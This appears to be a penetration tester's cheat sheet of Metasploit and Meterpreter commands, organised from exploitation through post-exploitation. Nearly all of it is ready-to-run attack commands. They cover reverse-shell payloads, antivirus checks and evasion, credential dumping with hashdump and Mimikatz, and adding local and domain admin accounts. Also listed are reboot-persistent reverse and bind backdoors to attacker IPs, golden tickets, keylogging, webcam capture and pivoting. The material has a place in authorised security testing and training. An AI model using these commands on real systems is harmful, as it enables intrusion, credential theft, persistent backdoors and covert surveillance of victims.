## Metasploit:  

    msfconsole [-n disables database support]
        Log output:  spool /root/20220317-log.1
        help <cmd>
        sessions [-h / -l / -i # / -k #]
        search [type: exploit platform:windows name:Microsoft app:server]
        info [exploit/windows/smb/ms10_061_spoolss]
        use [exploit/windows/smb/ms10_061_spoolss  \\  #]
            show options
                show advanced
            show targets
            show payloads
            set payload [windows/meterpreter/reverse_tcp]
                RHOST (exploit): where the packet goes next
                LHOST (payload): the IP of the box that the target box will send the packet to
            set prependmigrateprocess spoolsv.exe
            set prependmigrate true
        exploit  
   
## Meterpreter:  

    General Commands:
          https://www.hackers-arise.com/ultimate-list-of-meterpreter-command
          sessions; sessions -i <#>; sessions -k <#>
          shell
          jobs; jobs -h; jobs -K
          getsystem
          hashdump
          help
          Run Script: run ... - scripts located in /usr/share/metasploit-framework/modules/post and /usr/share/metasploit-framework/scripts/meterpreter
              Useful Scripts: https://www.hackers-arise.com/ultimate-list-of-meterpreter-scripts
          Run Command:
              run multicommand -cl ["cmd.exe /c at","cmd.exe /c schtasks /query"  \\  "cmd.exe /c dir c:\\windows\\temp /od /tw"] [-f <local output file>]
              Background:  execute [-f fpipe.exe -a '-l 12345 -r 45678 192.168.11.26']
              shell  \\  execute -i -f [/system/bin/sh  \\  cmd.exe]
              WMIC:  run post/windows/gather/wmic_command COMMAND="startup list"
          background
          upload/download   (ex.  download [c:\\boot.ini]  ;  upload [evil_trojan.exe c:\\windows\\system32])
          reg
          search  (ex.  search [-f autoexec.bat] [-f sea*.bat c:\\xamp\\])
          edit <file> (uses vim)
          resource <local file>  (runs script of commands)
          kill

    Techniques:
          Migrate to Stable Process:  migrate <PID of spoolsv.exe>
          Switch Payload Architecture:  use post/windows/manage/archmigrate; set SESSION 1; set IGNORE_SYSTEM=true
          Duplicate Session:  use post/windows/manage/multi_meterpreter_inject; set ... IPLIST="IP of next hop back--prob jump internal IP, same as rev shell IP" LPORT=3333 SESSION=1 HANDLER=true PAYLOAD=windows/x64/meterpreter/reverse_tcp  
              Or:  run duplicate -D -P 364 -p 443 -r 192.168.137.152  ;  -P <PID>, -r <Attacker IP>, -p <remote port>, -D disable the automatic exploit/multi/handler
          Open another shell:  use post/windows/manage/payload_inject; set ... LHOST=172.17.10.80 LPORT=4444 SESSION=1 HANDLER=true PAYLOAD=windows/x64/meterpreter/reverse_tcp
          Upload file:  upload "/root/psloglist.exe" "c:/windows/temp/psloglist.exe"
          Pivot:  execute -f fpipe.exe -a '-l 12345 -r 12345 192.168.1.1'
          search -f *.txt -d c:\\documents\ and\ settings\\administrator\\desktop\\

    Situational Awareness:
          localtime  \\  run multicommand -cl "cmd.exe /c date /t","cmd.exe /c time /t","cmd.exe /c w32tm /tz"  \\  run post/windows/gather/wmic_command COMMAND="os get localdatetime"
          ipconfig  \\  run get_local_subnets
          netstat
          getuid
          getpid
          ps
          run post/windows/gather/enum_logged_on_users
          idletime
          sysinfo
          run multicommand -cl 'cmd.exe /c systeminfo' 
    Users/Privs:
          getprivs  \\  run post/windows/gather/win_privs
        getsid
        run multicommand -cl "cmd.exe /c net users","cmd.exe /c net accounts"
        run multicommand -cl 'cmd.exe /c net localgroup administrators' 
    Environment:
        run get_env  \\  run post/multi/gather/env
        run checkvm
        Check AV:
            ps
            run getcountermeasure
            run post/windows/gather/enum_applications
            run post/windows/gather/wmic_command COMMAND='/node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get * /format:list'
                Confirm:  run multicommand -cl 'cmd.exe /c sc queryex state= all|findstr /i /r "Defender Security Virus Symantec McAfee Baidu Sophos Scan Client Agent Malware Kaspersky"'  \\  run multicommand -cl 'cmd.exe /c wmic process get commandline /format:list|findstr /i /r "Defender Security Virus Symantec McAfee Baidu Sophos Scan Client Agent Malware Kaspersky"'					
                Status:  run multicommand -cl 'cmd.exe /c sc query [WinDefend\SAVService\...]'
                #run killav  \\  #run virusscan_bypass
        Check Firewall:
            run multicommand -cl "cmd.exe /c netsh advfirewall show currentprofile","cmd.exe /c netsh advfirewall show allprofiles"  \\  run multicommand -cl "cmd.exe /c netsh firewall show config"
            run multicommand -cl 'cmd.exe /c netsh advfirewall monitor show firewall'
            run multicommand -cl 'cmd.exe /c netsh advfirewall firewall show rule name=all > c:\windows\temp\rules.txt' ; download c:/windows/temp/rules.txt /tmp ; rm c:/windows/temp/rules.txt ; dos2unix -n -f /tmp/rules.txt /tmp/rules2
                *Note the profiles
                *Check Enabled, Direction, Profile, Protocol, Action
                **Check Default Policy** -> port might be allowed by default
        Check Auditing:  run multicommand -cl 'cmd.exe /c auditpol /get /category:*'
        Hardware:  run post/windows/gather/wmic_command COMMAND="computersystem get TotalPhysicalMemory"; run post/windows/gather/wmic_command COMMAND="computersystem get FreePhysicalMemory"  \\  run multicommand -cl 'cmd.exe /c systeminfo'        
    Networking:
        run multicommand -cl 'cmd.exe /c nbtstat -n'
        route
        run multicommand -cl "cmd.exe /c netsh interface ip show config"  (Shows DNS server, etc.)
        getproxy
        Domain Enum:  run multicommand -cl "cmd.exe /c nbtstat -n"; load extapi; adsi_computer_enum <domain>; adsi_user_enum <domain>; adsi_nested_group_user_enum <domain> "CN=Domain Admins,CN=Users,DC=boot,DC=lab"; might need to: steal_token <PID of user process> ; then drop_token
        Resolve Hostname:  resolve <hostname>
        Scan:
            use post/windows/gather/arp_scanner
            use auxiliary/scanner/portscan/tcp
    Enumeration:
        ps
        run post/windows/gather/enum_applications
        reg enumkey -k 'HKLM\software'
        reg enumkey -k 'HKLM\software\microsoft'
        run multicommand -cl "cmd.exe /c at","cmd.exe /c schtasks /query"
        run post/windows/gather/enum_services  \\  run multicommand -cl "cmd.exe /c sc queryex state= all"
        run multicommand -cl "cmd.exe /c net use","cmd.exe /c net share"  \\  run post/windows/gather/enum_shares
        run post/windows/gather/forensics/enum_drives  \\  show_mount
        run post/windows/gather/wmic_command COMMAND="startup list"
        reg queryval -k 'HKLM\software\microsoft\powershell\1\powershellengine' -v powershellversion
        search -f *.doc* ; search -f *.xls* ; search -f *.ppt* ; search -f *.pdf*
        run multicommand -cl 'cmd.exe /c where /R C:\users *.exe | findstr /i "Temp"'
    Dump Info:
        run remotewinenum -u administrator -p password -t 10.1.1.1
        run scraper
        run winenum
    Pivoting/Redirection:
        See Post-Exploit->Port Redirection & Tunneling
        portfwd
        autoroute
        hostsedit
    PrivEsc:
        getsystem
        use priv
        use post/multi/recon/local_exploit_suggester  ;  use exploit/windows/local/...
    Creds:
        hashdump  \\  Better:  run hashdump \ run post/windows/gather/smart_hashdump
            john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
            use auxiliary/analyze/jtr_crack_fast
        GPO creds:  use post/windows/gather/credentials/gpp, set ... DOMAINS=BOOT SESSION=#
        run credcollect
        steal_token <PID> / drop_token
        Mimikatz:
            Option 1: load kiwi; creds_all  \\  creds_msv  \\  creds_kerberos   (require System)
            Option 2: load kiwi; kiwi_cmd "privilege::debug"; kiwi_cmd "sekurlsa::logonPasswords full"; kiwi_cmd "sekurlsa::credman"; kiwi_cmd "SEKURLSA::Kerberos"; kiwi_cmd "SEKURLSA::Krbtgt"; kiwi_cmd "SEKURLSA::SSP"; kiwi_cmd "SEKURLSA::Wdigest"
    Persistence:
        Add User:  Local: run multicommand -cl "cmd.exe /c net user metasploit p@55w0rd /ADD","cmd.exe /c net localgroup 'Administrators' metasploit /ADD" ; Domain: run multicommand -cl "cmd.exe /c net user metasploit p@55w0rd /ADD /DOMAIN","cmd.exe /c net group "Domain Admins" metasploit /ADD /DOMAIN"
            Make Domain Admin:  run multicommand -cl 'cmd.exe /c net group "Domain admins" mossa /add /domain'; run multicommand -cl 'cmd.exe /c net group "Domain admins" /domain'
        RDP:
            run post/windows/manage/enable_rdp username=admin,password=password
                Or: run getgui -e  //  or  run getgui -u loneferret -p password  ;  then cleanup:  ex. run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
        Telnet:  run gettelnet [-e  //  -u user -p pass]
        Meterpreter Bind Backdoor:  run metsvc; use exploit/multi/handler; set PAYLOAD windows/metsvc_bind_tcp; set LPORT 31337; set RHOST 192.168.1.104; run
            Reverse Backdoor (reboot persistent):  run persistence -U -i 5 -p 443 -r 192.168.1.71; use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.71; set LPORT 443; exploit
        Golden Ticket:  load kiwi;  golden_ticket_create -u mossa -d BOOT.LAB -k (krbtgt hash last half only) -s (Domain User SID w/o last 4 digits--from enum_users) -t /tmp/ticket
            kerberos_ticket_list; kerberos_ticket_use /tmp/ticket
    Hardware:
        Clipboard:  load extapi; clipboard_get_data; clipboard_monitor_start; clipboard_monitor_dump
        Keylogger:  keyscan_start; keyscan_stop; keyscan_dump  (after migrating to explorer)
        webcam_list \ webcam_snap
        screengrab
        run vnc  -  opens quick viewing session
